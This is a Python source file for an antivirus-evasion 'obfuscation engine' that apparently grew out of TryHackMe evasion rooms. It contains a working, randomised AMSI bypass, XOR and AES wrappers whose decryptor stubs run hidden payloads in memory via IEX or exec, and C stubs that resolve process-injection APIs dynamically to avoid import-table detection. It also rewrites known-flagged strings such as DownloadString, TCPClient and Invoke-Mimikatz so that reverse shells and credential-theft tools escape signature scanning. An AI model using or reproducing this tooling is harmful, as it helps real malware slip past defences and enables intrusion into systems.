"""venom37 obfuscation engine - AV evasion techniques.

Implements techniques from TryHackMe Obfuscation Principles and Signature Evasion rooms:
- String concatenation/splitting
- Variable name randomization (English word-based for low entropy)
- Junk code insertion with opaque predicates
- Case randomization (PowerShell)
- Tick/backtick insertion (PowerShell)
- XOR encryption with runtime decryptor stubs
- AES encryption with runtime decryptor stubs
- AMSI bypass prepending
- Dynamic API loading stubs (C/Windows)
"""
from __future__ import annotations

import base64
import os
import random
import re
import string


ENGLISH_WORDS = [
    "nature", "forest", "river", "cloud", "stone", "maple", "ocean", "breeze",
    "dawn", "dusk", "amber", "coral", "frost", "grain", "haven", "ivory",
    "jade", "knoll", "lemon", "marsh", "noble", "olive", "pearl", "quartz",
    "ridge", "sage", "thorn", "unity", "vapor", "willow", "zenith", "arch",
    "bloom", "cedar", "delta", "ember", "fable", "glade", "heron", "inlet",
    "jewel", "kelp", "lotus", "mirth", "nexus", "oasis", "plume", "quest",
    "realm", "spark", "trove", "umbra", "vivid", "wren", "yield", "zeal",
    "azure", "birch", "crest", "drift", "epoch", "flint", "grove", "heath",
    "iris", "lance", "mesa", "north", "orbit", "prism", "quota", "raven",
    "slate", "tempo", "ultra", "vault", "wheat", "alpine", "basin", "cliff",
    "depth", "elm", "fjord", "gust", "hull", "iron", "juniper", "kite",
    "lunar", "mist", "nectar", "onyx", "petal", "quill", "rowan", "storm",
    "tide", "umber", "vine", "wold", "yarrow", "zinc", "aspen", "brine",
]

_TICK_SAFE = set(string.ascii_letters) - set("0abfnrtuUxv")


class Obfuscator:
    """Apply obfuscation techniques to payloads."""

    @staticmethod
    def randomize_case(s: str) -> str:
        """Randomly change case of each char (PowerShell safe)."""
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    @staticmethod
    def insert_ticks(s: str, density: float = 0.3) -> str:
        """Insert PowerShell backticks into string."""
        out = []
        for c in s:
            if c in _TICK_SAFE and random.random() < density:
                out.append("`")
            out.append(c)
        return "".join(out)

    @staticmethod
    def split_string(s: str, lang: str = "powershell") -> str:
        """Split a string using concatenation for the given language."""
        if len(s) < 4:
            return repr(s) if lang == "python" else "'" + s + "'"
        parts = []
        i = 0
        while i < len(s):
            chunk_len = random.randint(2, max(2, len(s) // 3))
            parts.append(s[i:i + chunk_len])
            i += chunk_len
        if lang == "powershell":
            return "(" + "+".join("'" + p + "'" for p in parts) + ")"
        elif lang == "python":
            return "(" + "+".join(repr(p) for p in parts) + ")"
        elif lang == "csharp":
            return "(" + "+".join('"' + p + '"' for p in parts) + ")"
        return repr(s)

    @staticmethod
    def random_var_name(word_based: bool = True) -> str:
        """Generate a random variable name."""
        if word_based:
            a = random.choice(ENGLISH_WORDS)
            b = random.choice(ENGLISH_WORDS)
            return a + b.capitalize()
        return "".join(random.choices(string.ascii_lowercase, k=random.randint(8, 14)))

    @staticmethod
    def rename_variables(code: str, var_map: dict = None, lang: str = "powershell") -> tuple:
        """Replace variable names with randomized ones."""
        if var_map is None:
            var_map = {}
        if lang == "powershell":
            builtin = {"null", "true", "false", "_", "env", "PSVersionTable",
                        "ErrorActionPreference", "ProgressPreference", "args",
                        "input", "Host", "PSScriptRoot", "MyInvocation"}
            found = set(re.findall(r'\$([a-zA-Z_]\w{2,})', code))
            for var in found:
                if var not in builtin and var not in var_map:
                    var_map[var] = Obfuscator.random_var_name()
            for old, new in var_map.items():
                code = code.replace("$" + old, "$" + new)
        elif lang == "python":
            for old, new in var_map.items():
                code = re.sub(r'\b' + re.escape(old) + r'\b', new, code)
        return code, var_map

    @staticmethod
    def _junk_powershell() -> str:
        """Generate a single PowerShell junk statement."""
        templates = [
            lambda: "$" + Obfuscator.random_var_name() + " = " + str(random.randint(1, 9999)),
            lambda: "if (" + str(random.randint(10000, 99999)) + " -eq " + str(random.randint(1, 9999)) + ") { $" + Obfuscator.random_var_name() + " = '" + Obfuscator.random_var_name() + "' }",
            lambda: "$" + Obfuscator.random_var_name() + " = [math]::Round(" + str(round(random.uniform(1, 100), 2)) + ")",
            lambda: "$" + Obfuscator.random_var_name() + " = '" + Obfuscator.random_var_name() + "'.ToUpper()",
            lambda: "$" + Obfuscator.random_var_name() + " = @(" + str(random.randint(1, 100)) + ", " + str(random.randint(1, 100)) + ", " + str(random.randint(1, 100)) + ")",
        ]
        return random.choice(templates)()

    @staticmethod
    def _junk_python() -> str:
        """Generate a single Python junk statement."""
        templates = [
            lambda: Obfuscator.random_var_name() + " = " + str(random.randint(1, 9999)),
            lambda: "if " + str(random.randint(10000, 99999)) + " == " + str(random.randint(1, 9999)) + ": " + Obfuscator.random_var_name() + " = '" + Obfuscator.random_var_name() + "'",
            lambda: Obfuscator.random_var_name() + " = round(" + str(round(random.uniform(1, 100), 2)) + ")",
            lambda: Obfuscator.random_var_name() + " = '" + Obfuscator.random_var_name() + "'.upper()",
            lambda: Obfuscator.random_var_name() + " = [" + str(random.randint(1, 100)) + ", " + str(random.randint(1, 100)) + "]",
        ]
        return random.choice(templates)()

    @staticmethod
    def insert_junk_code(code: str, lang: str = "powershell", count: int = 3) -> str:
        """Insert junk code stubs between real lines."""
        lines = code.split("\n")
        junk_fn = Obfuscator._junk_powershell if lang == "powershell" else Obfuscator._junk_python
        if len(lines) < 2:
            junk_lines = [junk_fn() for _ in range(count)]
            return "\n".join(junk_lines[:count // 2 + 1] + [code] + junk_lines[count // 2 + 1:])
        result = [lines[0]]
        remaining = count
        for line in lines[1:]:
            n = random.randint(0, min(2, remaining))
            for _ in range(n):
                result.append(junk_fn())
                remaining -= 1
            result.append(line)
        for _ in range(remaining):
            result.append(junk_fn())
        return "\n".join(result)

    @staticmethod
    def xor_encrypt(payload: bytes, key: bytes = None) -> tuple:
        """XOR encrypt payload with key. Returns (encrypted, key)."""
        if key is None:
            key = os.urandom(16)
        encrypted = bytes(p ^ key[i % len(key)] for i, p in enumerate(payload))
        return encrypted, key

    @staticmethod
    def xor_decrypt_stub_powershell(encrypted_b64: str, key_b64: str) -> str:
        """Generate PowerShell XOR decryptor that runs payload in memory."""
        v_enc = Obfuscator.random_var_name()
        v_key = Obfuscator.random_var_name()
        v_bytes = Obfuscator.random_var_name()
        v_i = Obfuscator.random_var_name()
        v_dec = Obfuscator.random_var_name()
        return (
            "$" + v_enc + " = [Convert]::FromBase64String('" + encrypted_b64 + "')\n"
            "$" + v_key + " = [Convert]::FromBase64String('" + key_b64 + "')\n"
            "$" + v_bytes + " = New-Object byte[] $" + v_enc + ".Length\n"
            "for ($" + v_i + " = 0; $" + v_i + " -lt $" + v_enc + ".Length; $" + v_i + "++) {\n"
            "    $" + v_bytes + "[$" + v_i + "] = $" + v_enc + "[$" + v_i + "] -bxor $" + v_key + "[$" + v_i + " % $" + v_key + ".Length]\n"
            "}\n"
            "$" + v_dec + " = [System.Text.Encoding]::UTF8.GetString($" + v_bytes + ")\n"
            "IEX $" + v_dec
        )

    @staticmethod
    def xor_decrypt_stub_python(encrypted_b64: str, key_b64: str) -> str:
        """Generate Python XOR decryptor."""
        v_enc = Obfuscator.random_var_name()
        v_key = Obfuscator.random_var_name()
        v_dec = Obfuscator.random_var_name()
        return (
            "import base64 as _b\n"
            + v_enc + "=_b.b64decode('" + encrypted_b64 + "')\n"
            + v_key + "=_b.b64decode('" + key_b64 + "')\n"
            + v_dec + "=bytes(" + v_enc + "[i]^" + v_key + "[i%len(" + v_key + ")] for i in range(len(" + v_enc + "))).decode()\n"
            "exec(" + v_dec + ")"
        )

    @staticmethod
    def aes_encrypt(payload: bytes, key: bytes = None) -> tuple:
        """AES-CBC encrypt payload. Returns (encrypted, key, iv). Uses openssl CLI."""
        if key is None:
            key = os.urandom(16)
        iv = os.urandom(16)
        import subprocess
        proc = subprocess.run(
            ["openssl", "enc", "-aes-128-cbc", "-nosalt", "-K", key.hex(), "-iv", iv.hex()],
            input=payload, capture_output=True
        )
        if proc.returncode != 0:
            raise RuntimeError("AES encryption failed. Ensure openssl is installed.")
        return proc.stdout, key, iv

    @staticmethod
    def aes_decrypt_stub_powershell(encrypted_b64: str, key_b64: str, iv_b64: str) -> str:
        """Generate PowerShell AES decryptor stub using .NET crypto."""
        v_aes = Obfuscator.random_var_name()
        v_dec = Obfuscator.random_var_name()
        v_ms = Obfuscator.random_var_name()
        v_cs = Obfuscator.random_var_name()
        v_sr = Obfuscator.random_var_name()
        v_result = Obfuscator.random_var_name()
        return (
            "$" + v_aes + " = New-Object System.Security.Cryptography.AesManaged\n"
            "$" + v_aes + ".Mode = [System.Security.Cryptography.CipherMode]::CBC\n"
            "$" + v_aes + ".Padding = [System.Security.Cryptography.PaddingMode]::PKCS7\n"
            "$" + v_aes + ".Key = [Convert]::FromBase64String('" + key_b64 + "')\n"
            "$" + v_aes + ".IV = [Convert]::FromBase64String('" + iv_b64 + "')\n"
            "$" + v_dec + " = $" + v_aes + ".CreateDecryptor()\n"
            "$" + v_ms + " = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String('" + encrypted_b64 + "'))\n"
            "$" + v_cs + " = New-Object System.Security.Cryptography.CryptoStream($" + v_ms + ", $" + v_dec + ", [System.Security.Cryptography.CryptoStreamMode]::Read)\n"
            "$" + v_sr + " = New-Object System.IO.StreamReader($" + v_cs + ")\n"
            "$" + v_result + " = $" + v_sr + ".ReadToEnd()\n"
            "$" + v_sr + ".Close()\n"
            "$" + v_ms + ".Close()\n"
            "IEX $" + v_result
        )

    @staticmethod
    def amsi_bypass(randomize: bool = True) -> str:
        """Generate an obfuscated AMSI bypass for PowerShell."""
        if not randomize:
            return (
                "$Value='SetValue'\n"
                "[Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils')"
                ".GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic').$Value($null,$true)"
            )
        v_val = Obfuscator.random_var_name()
        v_type = Obfuscator.random_var_name()
        v_field = Obfuscator.random_var_name()
        ns_choices = [
            "'System.Management.Automation.'+'Amsi'+'Utils'",
            "'Sys'+'tem.Man'+'agement.Auto'+'mation.Ams'+'iUtils'",
            "'System.Mana'+'gement.Autom'+'ation.'+'AmsiUtils'",
            "'System.'+'Management.'+'Automation.'+'Amsi'+'Utils'",
        ]
        ns = random.choice(ns_choices)
        field_choices = [
            "'amsi'+'Init'+'Failed'",
            "'ams'+'iInitF'+'ailed'",
            "'a'+'msiInit'+'Failed'",
            "'amsiInit'+'Fa'+'iled'",
        ]
        field = random.choice(field_choices)
        flag_choices = [
            "'No'+'nPublic,S'+'tatic'",
            "'NonPu'+'blic,St'+'atic'",
            "'Non'+'Public'+',Static'",
            "'NonPublic,'+''+'Static'",
        ]
        flags = random.choice(flag_choices)
        return (
            "$" + v_val + "='SetValue'\n"
            "$" + v_type + "=[Ref].Assembly.GetType(" + ns + ")\n"
            "$" + v_field + "=$" + v_type + ".GetField(" + field + "," + flags + ")\n"
            "$" + v_field + ".$" + v_val + "($null,$true)"
        )

    @staticmethod
    def dynamic_api_stub(api_calls: list) -> str:
        """Generate C code for dynamic API loading (avoids IAT detection)."""
        api_dll_map = {
            "CreateProcessA": "kernel32.dll", "CreateProcessW": "kernel32.dll",
            "VirtualAlloc": "kernel32.dll", "VirtualProtect": "kernel32.dll",
            "VirtualAllocEx": "kernel32.dll", "WriteProcessMemory": "kernel32.dll",
            "CreateRemoteThread": "kernel32.dll", "OpenProcess": "kernel32.dll",
            "WaitForSingleObject": "kernel32.dll", "CreateThread": "kernel32.dll",
            "WSAStartup": "ws2_32.dll", "WSASocketA": "ws2_32.dll",
            "WSAConnect": "ws2_32.dll", "connect": "ws2_32.dll",
            "socket": "ws2_32.dll", "send": "ws2_32.dll", "recv": "ws2_32.dll",
            "NtAllocateVirtualMemory": "ntdll.dll", "NtWriteVirtualMemory": "ntdll.dll",
            "RtlMoveMemory": "ntdll.dll", "MessageBoxA": "user32.dll",
            "InternetOpenA": "wininet.dll", "InternetConnectA": "wininet.dll",
            "HttpOpenRequestA": "wininet.dll",
        }
        api_typedef_map = {
            "VirtualAlloc": "LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD)",
            "VirtualProtect": "BOOL (WINAPI *)(LPVOID, SIZE_T, DWORD, PDWORD)",
            "CreateProcessA": "BOOL (WINAPI *)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION)",
            "CreateRemoteThread": "HANDLE (WINAPI *)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)",
            "WriteProcessMemory": "BOOL (WINAPI *)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *)",
            "OpenProcess": "HANDLE (WINAPI *)(DWORD, BOOL, DWORD)",
            "CreateThread": "HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)",
            "WaitForSingleObject": "DWORD (WINAPI *)(HANDLE, DWORD)",
            "RtlMoveMemory": "VOID (WINAPI *)(VOID UNALIGNED *, const VOID UNALIGNED *, SIZE_T)",
        }
        lines = [
            "#include <windows.h>",
            "#include <stdio.h>",
            "",
            "// Dynamic API resolution - removes these calls from the IAT",
            "// Generated by venom37 obfuscation engine",
            "",
        ]
        dll_apis = {}
        for api in api_calls:
            dll = api_dll_map.get(api, "kernel32.dll")
            dll_apis.setdefault(dll, []).append(api)
        for dll, apis in dll_apis.items():
            handle_var = "h" + dll.replace(".dll", "").replace(".", "_").capitalize()
            lines.append('HMODULE ' + handle_var + ' = LoadLibraryA("' + dll + '");')
            for api in apis:
                typedef = api_typedef_map.get(api, "FARPROC")
                ptr_name = "p" + api
                if typedef == "FARPROC":
                    lines.append('FARPROC ' + ptr_name + ' = GetProcAddress(' + handle_var + ', "' + api + '");')
                else:
                    type_alias = "fn" + api
                    lines.append("typedef " + typedef.replace("*", "* " + type_alias) + ";")
                    lines.append(type_alias + " " + ptr_name + " = (" + type_alias + ")GetProcAddress(" + handle_var + ', "' + api + '");')
            lines.append("")
        lines.append("// Now use pApiName instead of ApiName directly")
        lines.append("// Example: pVirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);")
        return "\n".join(lines)

    @staticmethod
    def wrap_xor_powershell(payload: str) -> str:
        """Wrap a PowerShell payload in XOR encryption with runtime decryptor."""
        encrypted, key = Obfuscator.xor_encrypt(payload.encode())
        enc_b64 = base64.b64encode(encrypted).decode()
        key_b64 = base64.b64encode(key).decode()
        return Obfuscator.xor_decrypt_stub_powershell(enc_b64, key_b64)

    @staticmethod
    def wrap_xor_python(payload: str) -> str:
        """Wrap a Python payload in XOR encryption with runtime decryptor."""
        encrypted, key = Obfuscator.xor_encrypt(payload.encode())
        enc_b64 = base64.b64encode(encrypted).decode()
        key_b64 = base64.b64encode(key).decode()
        return Obfuscator.xor_decrypt_stub_python(enc_b64, key_b64)

    @staticmethod
    def wrap_aes_powershell(payload: str) -> str:
        """Wrap a PowerShell payload in AES encryption with runtime decryptor."""
        encrypted, key, iv = Obfuscator.aes_encrypt(payload.encode())
        enc_b64 = base64.b64encode(encrypted).decode()
        key_b64 = base64.b64encode(key).decode()
        iv_b64 = base64.b64encode(iv).decode()
        return Obfuscator.aes_decrypt_stub_powershell(enc_b64, key_b64, iv_b64)

    @staticmethod
    def obfuscate_powershell(code: str, level: int = 2) -> str:
        """Apply multiple obfuscation layers to PowerShell code.

        Level 1: string splitting + case randomization
        Level 2: + variable renaming + tick insertion
        Level 3: + junk code + AMSI bypass prepend
        """
        if level < 1:
            return code
        flagged = [
            "AmsiScanBuffer", "AmsiUtils", "amsiInitFailed",
            "Invoke-Expression", "DownloadString", "Net.WebClient",
            "IEX", "System.Net.Sockets", "TCPClient",
            "GetStream", "StreamReader", "Invoke-Mimikatz",
            "Invoke-PowerShellTcp",
        ]
        for s in flagged:
            if s in code:
                code = code.replace(s, Obfuscator.split_string(s, "powershell"))
        tokens = re.findall(r'[A-Za-z][\w-]{3,}', code)
        for token in set(tokens):
            if token not in ("True", "False", "None", "null", "true", "false"):
                code = code.replace(token, Obfuscator.randomize_case(token))
        if level < 2:
            return code
        code, _ = Obfuscator.rename_variables(code, lang="powershell")
        def tick_strings(match):
            content = match.group(1)
            return "'" + Obfuscator.insert_ticks(content, density=0.2) + "'"
        code = re.sub(r"'([^']{4,})'", tick_strings, code)
        if level < 3:
            return code
        code = Obfuscator.insert_junk_code(code, lang="powershell", count=5)
        code = Obfuscator.amsi_bypass(randomize=True) + "\n\n" + code
        return code

    @staticmethod
    def obfuscate_python(code: str, level: int = 2) -> str:
        """Apply obfuscation to Python code.

        Level 1: variable renaming
        Level 2: + junk code insertion
        Level 3: + XOR wrapping (entire payload encrypted)
        """
        if level < 1:
            return code
        common_vars = {"sock", "addr", "port", "shell", "proc", "cmd", "data", "buf"}
        var_map = {}
        for var in common_vars:
            if re.search(r'\b' + var + r'\b', code):
                var_map[var] = Obfuscator.random_var_name()
        if var_map:
            code, _ = Obfuscator.rename_variables(code, var_map=var_map, lang="python")
        if level < 2:
            return code
        code = Obfuscator.insert_junk_code(code, lang="python", count=4)
        if level < 3:
            return code
        code = Obfuscator.wrap_xor_python(code)
        return code
